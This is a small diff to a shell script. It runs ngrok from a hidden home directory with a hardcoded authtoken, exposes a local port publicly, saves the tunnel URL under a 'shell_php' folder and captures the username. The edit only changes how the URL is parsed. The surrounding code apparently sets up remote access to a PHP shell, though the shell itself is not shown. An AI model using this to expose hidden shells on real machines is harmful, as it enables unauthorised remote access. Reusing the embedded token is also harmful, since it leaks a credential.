@@ -19,7 +19,7 @@ sleep 2s
 $HOME/._/ngrok config add-authtoken 2McugxcxDRIG8tW8mup9hBZYQX9_7rMFxxJoWXxREeBmRvkNF
 $HOME/._/ngrok http $PORT > /dev/null &
 sleep 3s
-echo "$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url)"  > $HOME/._/shell_php/link
+echo "$(curl -s localhost:4040/api/tunnels | awk -F'"public_url":"' '{print $2}' | awk -F'"' '{print $1}')"  > $HOME/._/shell_php/link
 
 link="$(cat $HOME/._/shell_php/link)"
 user="$(whoami)"
